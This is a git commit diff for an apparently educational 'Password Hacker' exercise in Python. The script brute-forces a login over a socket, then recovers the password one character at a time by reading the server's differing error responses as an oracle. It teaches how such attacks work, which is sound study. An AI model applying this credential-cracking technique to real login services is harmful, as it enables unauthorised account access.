03c6b0059bf293dc1293843a1cdedb61b07c4d97
silverscorpio <rajat.newtoneinstein@gmail.com>
2023-10-08 05:25:23 +0200

    stage 4 done

--- python_core/Password Hacker (Python)/Password Hacker (Python)/task/hacking/hack.py
+++ python_core/Password Hacker (Python)/Password Hacker (Python)/task/hacking/hack.py
@@ -16,22 +16,20 @@ def check_creds(socket_conn: socket, creds_data: list[str], creds_type: str) -> 
                 cracked_creds[creds_type] = val_combo
                 response = socket_operation(soc_con=socket_conn,
                                             msg=json.dumps(cracked_creds))
-
                 if json.loads(response)["result"] == "Wrong password!":
                     return val_combo
 
             elif creds_type == "password":
-                while True:
-                    pwd_chars.append(val_combo)
-                    response = socket_operation(soc_con=socket_conn,
-                                                msg=json.dumps(cracked_creds))
-                    if json.loads(response)["result"] == "Exception happened during login":
-                        break
-                    elif json.loads(response)["result"] == "Connection success!":
-                        break
-                    else:
-                        pwd_chars.pop()
-                return
+                pwd_chars.append(val_combo)
+                cracked_creds[creds_type] = "".join(pwd_chars)
+                response = socket_operation(soc_con=socket_conn,
+                                            msg=json.dumps(cracked_creds))
+                if json.loads(response)["result"] == "Exception happened during login":
+                    return
+                elif json.loads(response)["result"] == "Connection success!":
+                    return "success"
+                else:
+                    pwd_chars.pop()
 
 
 def main():
@@ -42,9 +40,13 @@ def main():
         cracked_creds["login"] = check_creds(socket_conn=client_socket,
                                              creds_data=logins,
                                              creds_type="login")
-        check_creds(socket_conn=client_socket,
-                    creds_data=ALL_ELEMENTS_STR,
-                    creds_type="password")
+
+        while True:
+            value = check_creds(socket_conn=client_socket,
+                                creds_data=ALL_ELEMENTS_STR,
+                                creds_type="password")
+            if value == "success":
+                break
 
 
 if __name__ == "__main__":
@@ -54,7 +56,8 @@ if __name__ == "__main__":
     pwd_chars = []
     cracked_creds = {
         "login": "",
-        "password": "".join(pwd_chars)
+        "password": ""
     }
     main()
-    print(json.dumps(cracked_creds, indent=4))
+    ans = json.dumps(cracked_creds)
+    print(ans)
